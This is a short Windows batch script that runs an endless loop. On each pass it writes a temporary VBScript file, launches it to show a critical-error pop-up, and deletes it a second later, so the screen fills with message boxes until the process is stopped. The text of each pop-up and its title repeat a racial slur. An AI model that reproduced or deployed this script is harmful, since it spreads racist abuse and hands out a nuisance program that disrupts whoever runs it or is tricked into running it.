@echo off
setlocal enabledelayedexpansion

:: Infinite loop
:loop

    :: Create temporary VBS file
    set VBSFILE=%temp%\error.vbs
    echo MsgBox "NIGGA NIGGA NIGGA NIGGA NIGGA", vbCritical, "IM 200% NIGGA " > "!VBSFILE!"

    :: Run the VBS file asynchronously (start /b) so it doesn't wait
    start "" cscript //nologo "!VBSFILE!"

    :: Optional: delete the temporary VBS after a short delay
    timeout /t 1 /nobreak >nul
    del "!VBSFILE!"

    goto loop
